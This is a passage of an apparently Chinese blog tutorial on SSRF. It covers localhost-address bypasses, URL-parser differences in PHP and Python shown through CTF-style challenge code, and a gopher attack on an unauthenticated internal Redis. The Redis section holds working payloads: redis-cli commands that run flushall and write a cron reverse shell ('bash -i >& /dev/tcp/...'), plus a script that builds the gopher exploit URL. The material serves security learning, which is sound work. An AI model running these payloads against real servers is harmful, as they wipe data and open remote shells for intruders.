class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="其他各种指向127-0-0-1的地址"><a href="#其他各种指向127-0-0-1的地址" class="headerlink" title="其他各种指向127.0.0.1的地址"></a>其他各种指向127.0.0.1的地址</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/      √   # localhost就是代指<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>/              √  # <span class="hljs-number">0</span>在window下代表<span class="hljs-number">0.0.0.0</span>，而在liunx下代表<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0.0.1</span>]/ √   # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://[::]:<span class="hljs-number">80</span>/           # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>/       # 用中文句号绕过<br><span class="hljs-attribute">http</span>://①②⑦.⓪.⓪.①<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">1</span>/ √<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">001</span>/ √ # <span class="hljs-number">0</span>的数量多一点少一点都没影响，最后还是会指向<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><h3 id="利用URL的解析差异"><a href="#利用URL的解析差异" class="headerlink" title="利用URL的解析差异"></a>利用URL的解析差异</h3><p> 小知识点</p><p><strong>url构成</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">scheme:</span>//<span class="hljs-symbol">user:</span>pass<span class="hljs-variable">@host</span><span class="hljs-symbol">:port/path?query=value</span><span class="hljs-comment">#fragment</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left"><strong>Scheme:</strong></th><th><strong>&#x2F;&#x2F;</strong></th><th><strong>Login:password@</strong></th><th><strong>host</strong></th><th><strong>:port</strong></th><th><strong>&#x2F;path&#x2F;to&#x2F;resource</strong></th><th><strong>?query_string</strong></th><th><strong>#fragment</strong></th></tr></thead><tbody><tr><td align="left">协议，如http等</td><td>层级url标识符</td><td>身份验证(默认，一般不输入)</td><td>（主机）服务器地</td><td>端口</td><td>文件路径</td><td>查询字符串</td><td>片段id（不重要）</td></tr></tbody></table><p><strong>（1）利用php的readfile和parse_url函数的解析差异绕过指定的端口</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://&#x27;</span>. <span class="hljs-variable">$_GET</span>[url];<br><span class="hljs-variable">$parsed</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<span class="hljs-comment">//parse_url解析传入的</span><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$parsed</span>[port] == <span class="hljs-number">80</span> )&#123;  <span class="hljs-comment">// 这里限制了我们传过去的url只能是80端口的</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$url</span>);<span class="hljs-comment">//readfile再次解析</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">正常传入：<span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">80</span>才可以，但利用解析差异可以绕过<br>（假设主机端口<span class="hljs-number">11211</span>是开放的）<br>payload：<br>?url=<span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">11211:80</span>/flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696" alt="1610601312_5fffd36035478c41c2c18.png!small?1610601312696"></p><p><strong>（2）利用curl和parse_url的解析差异绕指定的host</strong></p><p>原理如下：</p><p><img src="https://image.3001.net/images/20210114/1610601386_5fffd3aa565a51587d90c.png!small?1610601386867" alt="1610601386_5fffd3aa565a51587d90c.png!small?1610601386867"></p><p>从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse_url()函数对指定host的限制。</p><p>buu SSRF Training</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) //获取<span class="hljs-title">url</span>的域名，将域名转为<span class="hljs-title">ip</span>，然后再判断这个<span class="hljs-title">ip</span>是否是私有地址</span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>); <br>    <span class="hljs-comment">//^从开头开始匹配</span><br>   <span class="hljs-comment">//? 匹配0或1个正好在它之前的那个字符。注意：这个元字符不是所有的软件都支持的</span><br>    <span class="hljs-comment">//( )标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)</span><br>    <span class="hljs-comment">//.匹配除换行符 \n 之外的任何单字符。要匹配 . ，使用 \. </span><br>    <span class="hljs-comment">//*匹配前面的子表达式零次或多次。要匹配 * 字符，使用 \*</span><br>    <span class="hljs-comment">//$:从字符串末尾进行匹配</span><br>    <span class="hljs-comment">//需要形如http://xxxx/的ip地址</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) <br>    &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>        <span class="hljs-comment">//如果url不符合正则表达式</span><br>    &#125; <br>    <span class="hljs-keyword">try</span> <br>    &#123; <br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>); <br>        <span class="hljs-comment">//分解出一个URL的各个部</span><br>        <span class="hljs-comment">// $url_parse是一个数组</span><br>        <br>    &#125; <br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) <br>    &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125; <br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>]; <span class="hljs-comment">//hostname 为主机名，也就是域名</span><br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>); <span class="hljs-comment">//通过域名获取IP地址</span><br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//ip2long：将IPv4的ip地址（以小数点分隔形式）转换为int</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>; <br>    <span class="hljs-comment">//判断是否是私有地址，是则这个函数就返回1</span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span><br><span class="hljs-function"></span>&#123; <br>     <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>)) <br>    <span class="hljs-comment">//判断url是否是私有地址</span><br>    &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>; <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">//初始化新的会话,返回 cURL 句柄，供curl_setopt()、 curl_exec() 和 curl_close() 函数使用</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <span class="hljs-comment">//访问的域名</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">//</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//</span><br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//抓取传入的URL并把它传递给浏览器</span><br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//php curl请求在curl_exec()函数执行之后，可以使用curl_getinfo()函数获取CURL请求输出的相关信息</span><br>     <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]) <br>        &#123; <br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// 关闭cURL资源，并且释放系统资源</span><br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>); <span class="hljs-comment">//执行</span><br>    &#125; <br>     <br>&#125; <br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;   <span class="hljs-comment">//判断url是否为空，不为空就执行</span><br>    <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>); <br>&#125; <br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">ip2long(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)  结果为<span class="hljs-number">2130706433</span><br>ip2long(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span>  结果为<span class="hljs-number">127</span> <br>ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>; <br>    <span class="hljs-regexp">//</span>判断是否是私有地址<br></code></pre></td></tr></table></figure><p>定义了两个方法check_inner_ip和safe_request_url</p><p>check_inner_ip里用parse_url来解析url后，通过正则匹配来限制http头，ip2long来限制主机</p><p>safe_request_url 通过check_inner_ip检测为安全网站后利用curl来处理请求</p><p>关键是要绕过check_inner_ip的检测，那么这里就利用了curl和parse_url的解析差异</p><p><img src="https://image.3001.net/images/20210114/1610601386_5fffd3aa565a51587d90c.png!small?1610601386867" alt="1610601386_5fffd3aa565a51587d90c.png!small?1610601386867"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-string">&#x27;http://username:password@127.0.0.1/path?arg=value#anchor&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><br>输出：<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [scheme] =&gt; http<br>    [host] =&gt; <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>    [user] =&gt; username<br>    [pass] =&gt; password<br>    [path] =&gt; /path<br>    [query] =&gt; arg=value<br>    [fragment] =&gt; anchor<br>)<br>  <br>  url换成 http:<span class="hljs-comment">//a:@127.0.0.1:80@baidu.com</span><br>输出：<br>  <span class="hljs-title function_ invoke__">Array</span><br>(<br>    [scheme] =&gt; http<br>    [host] =&gt; baidu.com<br>    [user] =&gt; a<br>    [pass] =&gt; @<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br><br></code></pre></td></tr></table></figure><p>这样就可以过函数的检测,而curl抓取到的是127.0.0.1:80</p><p>最终payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//a</span>:@127.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">80</span>@baidu.com/flag.php<br></code></pre></td></tr></table></figure><p>(3)python函数解析差异</p><p><img src="/image/2.png" alt="python函数解析差异"></p><p>测试代码：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>url=request<span class="hljs-selector-class">.form</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;handler&#x27;</span>]</span><br>host = urlparse<span class="hljs-selector-class">.urlparse</span>(url)<span class="hljs-selector-class">.hostname</span>  <span class="hljs-comment">//urllib2自带的库</span><br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;secret.corp&#x27;</span>:    <br>    return <span class="hljs-string">&#x27;Restricted Area!&#x27;</span><br><span class="hljs-keyword">else</span>:    <br>return urllib<span class="hljs-selector-class">.urlopen</span>(url)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">payload:</span><br><span class="hljs-symbol">http:</span>//google.com<span class="hljs-meta"># @secret.corp</span><br></code></pre></td></tr></table></figure><p>这里SSRF漏洞产生的根本原因是url中有空格(CRLF注入)，这让python中的两个模块解析url的时候起了冲突，urlparse认为host是google.com，而urllib则认为真正的host是secret.corp并且直接发出了请求。</p><h3 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h3><p>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><blockquote><p><strong>什么是Redis未授权访问？</strong></p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>简单说，漏洞的产生条件有以下两点：</p><ul><li>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li><li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li></ul></blockquote><p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~&#x2F;.ssh目录或&#x2F;var&#x2F;spool&#x2F;cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p><p>绝对路径写WebShell<br>常见redis命令的exp：（反弹shell）</p><p>反弹shell好像只能在Centos上可以，别的不行，好像是由于权限的问题，我测试的小靶场没成功</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> flushall  <span class="hljs-comment">//清空指定host的整个Redis服务器的数据</span><br>echo <span class="hljs-operator">-</span>e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>*/1 * * * * bash -i &gt;&amp; /dev/tcp/42.xx.xx.xxx/2333 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><span class="hljs-operator">|</span>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> <span class="hljs-operator">-</span>x <span class="hljs-keyword">set</span> <span class="hljs-number">1</span>  <span class="hljs-comment">//redis写定时任务获取root权限和反弹shell,使用了-e选项的 echo，会将 \n 认为是换行符。</span><br>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>cron<span class="hljs-operator">/</span> <br>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> config <span class="hljs-keyword">set</span> dbfilename root<br>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-variable">$1</span> save<br></code></pre></td></tr></table></figure><p>　<a href="https://www.runoob.com/linux/linux-comm-crontab.html">crontab命令</a></p><p>这个文件中是通过 5 个＊确定命令或任务的执行时间的，这 5 个*的具体含义如表所示。</p><table><thead><tr><th>项目</th><th>含义</th><th>范围</th></tr></thead><tbody><tr><td>第一个”*”</td><td>一小时当中的第几分钟（minute）</td><td>0~59</td></tr><tr><td>第二个”*”</td><td>一天当中的第几小时（hour）</td><td>0~23</td></tr><tr><td>第三个”*”</td><td>一个月当中的第几天（day）</td><td>1~31</td></tr><tr><td>第四个”*”</td><td>一年当中的第几个月（month）</td><td>1~12</td></tr><tr><td>第五个”*”</td><td>一周当中的星期几（week）</td><td>0~7（0和7都代表星期日）</td></tr></tbody></table><p> <strong>crontab的默认执行路径为：当前用户的根路径</strong>(&#x2F;var&#x2F;spool&#x2F;cron&#x2F;下也有)</p><p>crontab 是用来让使用者在固定时间或固定间隔执行程序</p><p>通过crontab命令设置每分钟自动反弹shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">\n\n*<span class="hljs-regexp">/1 * * * * bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">42</span>.xx.xx.xxx/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\n\n<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>脚本来改成适配的gopher协议</p><p>贴个脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import urllib<br><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;gopher://&quot;</span><br><span class="hljs-attribute">ip</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>　　／／vps<br><span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;6379&quot;</span><br><span class="hljs-attribute">reverse_ip</span>=<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span><br><span class="hljs-attribute">reverse_port</span>=<span class="hljs-string">&quot;2333&quot;</span><br><span class="hljs-attribute">cron</span>=<span class="hljs-string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)<br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;/var/spool/cron&quot;</span><br><span class="hljs-attribute">passwd</span>=<span class="hljs-string">&quot;&quot;</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br> <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.format(cron.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;IFS&#125;</span>&quot;</span>)),<br> <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),<br> <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),<br> <span class="hljs-string">&quot;save&quot;</span><br> ]<br><span class="hljs-keyword">if</span> passwd:<br>cmd.insert(0,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))<br><span class="hljs-attribute">payload</span>=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;<br>def redis_format(arr):<br><span class="hljs-attribute">CRLF</span>=<span class="hljs-string">&quot;\r\n&quot;</span><br>redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-attribute">cmd</span>=<span class="hljs-string">&quot;&quot;</span><br>cmd+=<span class="hljs-string">&quot;*&quot;</span>+str(len(redis_arr))<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+str(len((x.replace(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;IFS&#125;</span>&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;IFS&#125;</span>&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>cmd+=CRLF<br>return cmd<br><br><span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&quot;__main__&quot;:<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>payload += urllib.quote(redis_format(x))<br><span class="hljs-built_in">print</span> payload<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aflushall%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a2%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">45952</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span 